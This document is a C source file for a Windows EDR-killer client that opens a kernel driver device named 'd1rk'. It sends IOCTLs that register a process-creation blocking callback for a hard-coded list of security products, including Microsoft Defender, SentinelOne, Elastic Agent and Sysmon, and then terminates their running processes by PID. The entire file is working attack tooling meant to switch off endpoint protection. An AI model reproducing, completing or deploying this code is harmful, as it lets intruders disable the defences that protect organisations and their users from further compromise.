#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "DbgHelp.lib")


#define IOCTL_REGISTER_PCKC         CTL_CODE(0x8000, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KILL_PROC         CTL_CODE(0x8001, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define DEVICE_NAME "\\\\.\\d1rk"

#define MAX_PROC_NAME_LEN 64
#define MAX_EDR_COUNT     64

typedef struct _PROC_BLOCK_LIST {
    ULONG Count;
    CHAR Names[MAX_EDR_COUNT][MAX_PROC_NAME_LEN];
} PROC_BLOCK_LIST;



const char* edrProcess[] = { "MsMpEng.exe", "SecurityHealthService.exe",
        "SecurityHealthSystray.exe", "MsSense.exe", "SenseNdr.exe",
        "SenseTVM.exe", "NisSrv.exe", "smartscreen.exe", "SentinelServiceHost.exe",
        "SentinelAgent.exe", "SentinelStaticEngineScanner.exe", "SentinelMemoryScanner.exe",
        "SentinelStaticEngine.exe", "SentinelHelperService.exe", "SentinelUI.exe",
        "elastic-agent.exe", "Sysmon.exe", "filebeat.exe", "metricbeat.exe" };

const size_t edrCnt = sizeof(edrProcess) / sizeof(edrProcess[0]);




DWORD FindProcessId(const char* processName) {
    size_t wcharCount = mbstowcs(NULL, processName, 0) + 1;
    wchar_t* wprocessName = (wchar_t*)malloc(wcharCount * sizeof(wchar_t));
    if (!wprocessName) {
        return 0;
    }
    mbstowcs(wprocessName, processName, wcharCount);

    DWORD processId = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(snapshot, &processEntry)) {
            do {
                if (wcscmp(processEntry.szExeFile, wprocessName) == 0) {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }

    free(wprocessName);

    return processId;
}

void SetConsoleRed() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
}

void ResetConsoleColor() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}


void printf_Art() {
    SetConsoleRed();
    printf(
        "\n\n\n .oooooo..o ooooo    oooo    oooo ooooo ooooo      ooo \n"
        "d8P'    `Y8 `888'    `888    `888 `888' `888b.     `8' \n"
        "Y88bo.       888      888     888  888   8 `88b.    8  \n"
        " `\"Y8888o.   888      888     888  888   8   `88b.  8  \n"
        "     `\"Y88b  888      888     888  888   8     `88b.8  \n"
        "oo     .d8P  888      888     888  888   8       `888  \n"
        "8\"\"88888P'  o888o .o. 88P .o. 88P o888o o8o        `8  \n"
        "                  `Y888P  `Y888P                     \n"
        "                                                    \n\n\n\n"
    );
    ResetConsoleColor();
}


VOID RegisterKernelCallback(HANDLE deviceHandle) {

    DWORD BytesReturned;
    PROC_BLOCK_LIST procList = { 0 };

    procList.Count = (ULONG)edrCnt;
    printf("[+] Registering Blocking Process Creation  Kernel Callback Routine for:\n");

    for (size_t i = 0; i < edrCnt && i < MAX_EDR_COUNT; i++) {
        strncpy_s(procList.Names[i], MAX_PROC_NAME_LEN, edrProcess[i], _TRUNCATE);
        printf("\t=> %s\n", edrProcess[i]);
    }

    DeviceIoControl(deviceHandle,
        IOCTL_REGISTER_PCKC,
        &procList,
        sizeof(procList),
        NULL,
        0,
        &BytesReturned,
        NULL);

    printf("\n\n");
    return;
}



VOID KillEDR(HANDLE deviceHandle) {
    
    DWORD BytesReturned;

    for (size_t i = 0; i < edrCnt; i++) {
        DWORD pid = FindProcessId(edrProcess[i]);
        if (pid > 0) {
            printf("[+] Killing Process %s with PID = %d\n", edrProcess[i], pid);
            DeviceIoControl(deviceHandle,
                IOCTL_KILL_PROC,
                (LPVOID)&pid,
                sizeof(pid),
                NULL,
                0,
                &BytesReturned,
                NULL);
        }
    }

    return;
}

int main() {
    
    SetConsoleOutputCP(CP_UTF8);
    printf_Art();

    HANDLE hDevice = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open the device. Error code: %d\n", GetLastError());
        return 1;
    }

    // Registering Blocking Process Creation Routine
    RegisterKernelCallback(hDevice);
    
    // Killing EDR's processes
    KillEDR(hDevice);

    return 0;

}
